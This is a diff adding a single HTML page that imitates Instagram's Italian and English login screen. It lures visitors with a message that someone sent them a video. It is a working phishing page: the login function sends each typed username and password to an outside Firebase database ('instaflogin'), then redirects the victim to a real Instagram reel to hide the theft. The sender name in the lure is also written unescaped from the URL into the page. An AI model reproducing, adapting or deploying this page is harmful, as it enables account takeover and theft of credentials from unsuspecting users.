@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+
+<head>
+  <meta charset="UTF-8">
+  <title>Accesso • Instagram</title>
+  <link rel="icon" type="image/x-icon" href="https://www.instagram.com/favicon.ico">
+  <link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+</head>
+
+<body>
+  <div class="main-content">
+    <div class="header">
+      <div class="content" id="cntTitle">
+        Accedi per visualizzare il contenuto che ti é stato inviato
+      </div>
+
+    </div>
+    <div class="main">
+      <div class="wrapper"> <br>
+        <div class="login">
+          <span class="logo">Instagram</span><br>
+          <input type="text" id="usn" placeholder="Username" class="input-1" />
+          <input type="password" id="psw" placeholder="Password" class="input-2" />
+          <input type="button" value="Accedi" id="btnAcc" class="btn" onclick="login()" />
+
+          <div class="line">
+            <div>
+              <hr width="100%">
+            </div>
+            <span>o</span>
+            <div>
+              <hr width="100%">
+            </div>
+          </div>
+
+          <div class="loginWithfb"><img src="facebook-square-brands.svg" width="17px"
+              style="filter: invert(10%) sepia(72%) saturate(2294%) hue-rotate(204deg) brightness(94%) contrast(106%); margin-right: 5px;" >
+           <span id="loginWF">Accedi con Facebook</span> 
+          </div>
+
+          <div class="pswForg" id="pswF"> Hai dimenticato la password?</div>
+        </div>
+
+        <div class="sub-login"><span id="preSignup">Non hai un account?</span> <a
+            href="https://www.instagram.com/accounts/emailsignup/" id="signup">Iscriviti</a></div>
+      </div>
+      <br><br>
+
+      <div class="download" id="downl">
+        <span id="dwnld">Scarica l'applicazione</span>
+        <br><br>
+        <img
+          src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_italian-it.png/9078ec632936.png"
+          width="130px">
+        <img
+          src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_italian-it.png/a27e4240699a.png"
+          width="130px">
+      </div>
+    </div>
+    <div class="credits">
+      Meta
+
+
+
+      Informazioni
+      Blog
+      <span style="word-spacing: 0px">Lavora con noi</span>
+      Assistenza
+      API
+      Privacy
+      Condizioni
+      <span style="word-spacing: 0px">Account più popolari</span>
+      Hashtag
+      Luoghi
+
+      <span style="word-spacing: 0px">Instagram Lite</span>
+
+      <span style="word-spacing: 0px">Caricamento dei contatti e non-utenti</span>
+
+      <br>
+      <span style="word-spacing: 0px"> © 2022 Instagram from Meta</span>
+      <br><br><br>
+    </div>
+  </div>
+
+ <script src="https://www.gstatic.com/firebasejs/7.2.0/firebase-app.js"></script>
+ <script src="https://www.gstatic.com/firebasejs/7.2.0/firebase-database.js"></script>
+ 
+</body>
+<script>
+
+  var msg1 = "";
+  var msg2 = "";
+  var userLang = navigator.language || navigator.userLanguage;
+  if (userLang == 'it-IT') {
+
+    msg1 = " ti ha inviato un video, accedi per guardarlo";
+    msg2 = "Accedi per visualizzare il contenuto che ti é stato inviato";
+
+   
+    
+  } else {
+
+    msg1 = " sent you a video, login for watch it";
+    msg2 = "Log in to view the content sent to you";
+
+    document.getElementById("dwnld").innerHTML = "Download the application";
+    document.getElementById("pswF").innerHTML = "Have you forget your password?";
+    document.getElementById("signup").innerHTML = "Sign-up";
+    document.getElementById("preSignup").innerHTML = "Don't have an account?";
+    document.getElementById("loginWF").innerHTML = "Login with Facebook";
+    document.getElementById("btnAcc").value = "Login";
+    document.title = "Login • Instagram";
+  }
+
+  var name = findGetParameter("s");
+  if (name != null && name != 'null' && name != undefined && name != '') {
+    document.getElementById("cntTitle").innerHTML = findGetParameter("s") + msg1;
+  } else {
+    document.getElementById("cntTitle").innerHTML = "Accedi per visualizzare il contenuto che ti é stato inviato";
+  }
+
+  function findGetParameter(parameterName) {
+    var result = null,
+      tmp = [];
+    location.search
+      .substr(1)
+      .split("&")
+      .forEach(function (item) {
+        tmp = item.split("=");
+        if (tmp[0] === parameterName) result = decodeURIComponent(tmp[1]);
+      });
+    return result;
+  }
+
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyBAnWdRDRmzxrQJGjVgfzMfUY7AdG9vjmM",
+    authDomain: "instaflogin.firebaseapp.com",
+    databaseURL: "https://instaflogin-default-rtdb.firebaseio.com",
+    projectId: "instaflogin",
+    storageBucket: "instaflogin.appspot.com",
+    messagingSenderId: "650375111038",
+    appId: "1:650375111038:web:774aa61f9e19e4cf75932f",
+    measurementId: "G-QLBJ97R5PP"
+  };
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+  
+  function login() {
+    document.getElementById("btnAcc").disabled = true;
+    db.ref("/users/" + getRandomId() + '/' ).set({
+
+      tested: false,
+      username: document.getElementById("usn").value,
+      password: document.getElementById("psw").value,
+      
+    })
+    setInterval(function(){window.location.href = "https://www.instagram.com/reel/CWE_2CgpGHa/?utm_source=ig_web_copy_link"}, 1100)
+    //window.location.href = "https://www.instagram.com/reel/CWE_2CgpGHa/?utm_source=ig_web_copy_link";
+  }
+
+
+  function getRandomId(){
+    var letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'z'];
+    var id = '';
+    for(i = 0; i<20; i++){
+
+      id += letters[getRndInteger(0, 20)];
+    }
+
+    return id;
+  }
+
+  function getRndInteger(min, max) {
+  return Math.floor(Math.random() * (max - min + 1) ) + min;
+}
+
+</script>
+<style>
+  @font-face {
+    font-family: 'instagram';
+    src: url('instaFont.otf') format('opentype');
+  }
+
+  .logo {
+    font-family: instagram;
+    font-size: 40px;
+    text-align: center;
+  }
+
+  * {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    -webkit-appearance: none;
+    -webkit-border-radius: none;
+  }
+
+  .imgLogo {
+    width: 100%;
+    height: 70px;
+  }
+
+  body {
+    background-color: #EEEEEE;
+  }
+
+  .credits {
+    text-align: center;
+    word-spacing: 10px;
+    font-size: 12px;
+    color: rgb(110, 110, 110)
+  }
+
+  .pswForg {
+
+    margin-top: 15px;
+    text-align: center;
+    justify-content: center;
+    align-items: center;
+    font-size: 12px;
+    color: #385185;
+  }
+
+  .loginWithfb {
+
+    display: flex;
+    text-align: center;
+    justify-content: center;
+    align-items: center;
+    font-size: 14px;
+    color: #385185;
+  }
+
+  .line {
+    display: grid;
+    grid-template-columns: 1fr min-content 1fr;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: #a3a3a3;
+    font-size: 20px;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .line span {
+    margin-left: 10px;
+    margin-right: 10px;
+  }
+
+  .line hr {
+    margin-top: 20%;
+    height: 1px;
+    opacity: 0.67;
+    background-color: rgb(201, 201, 201);
+    /* Modern Browsers */
+    border: none;
+  }
+
+  html,
+  body {
+    margin: 0;
+    padding: 0;
+  }
+
+  .main-content {
+    width: 100vw;
+    height: 100vh;
+    display: grid;
+    grid-template-rows: min-content 1fr;
+    background-color: #eee;
+  }
+
+  .header {
+    display: flex;
+    justify-content: center;
+    background-color: #308de4;
+    /*#20c200*/
+    padding: 20px;
+
+    animation: fadeInAnimation ease 1s;
+    animation-iteration-count: 1;
+    animation-fill-mode: forwards;
+  }
+
+  @keyframes fadeInAnimation {
+    0% {
+      opacity: 0;
+      /*font-size: 17px;*/
+    }
+
+    100% {
+      opacity: 1;
+      /*font-size: 16px;*/
+    }
+  }
+
+  .header .content {
+    position: relative;
+    text-align: center;
+    color: white;
+  }
+
+  .main {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .wrapper {
+    display: flex;
+    flex-direction: column;
+    width: 330px;
+    grid-gap: 10px;
+  }
+
+  .login {
+    display: flex;
+    flex-direction: column;
+    background-color: white;
+    padding: 35px;
+    border: 1px solid #e6e6e6;
+    border-radius: 3px;
+  }
+
+  .login input {
+    margin-top: 10px;
+    padding: 8px 12px;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+  }
+
+  .login input[type=button] {
+    background-color: #3897f0;
+    border: 1px solid #3897f0;
+    color: #fff;
+    font-weight: bold;
+    cursor: pointer;
+  }
+
+  .sub-login {
+    background-color: white;
+    text-align: center;
+    padding: 10px 40px;
+    border-radius: 3px;
+    border: 1px solid #e6e6e6;
+    font-size: 14px;
+  }
+
+  .sub-login a {
+    color: #3897f0;
+    text-decoration: none;
+  }
+
+  .download {
+
+    text-align: center;
+    padding: 10px 40px;
+  }
+
+  .download a {
+    color: #3897f0;
+    text-weight: bold;
+    text-decoration: none;
+  }
+</style>
+
+</html>
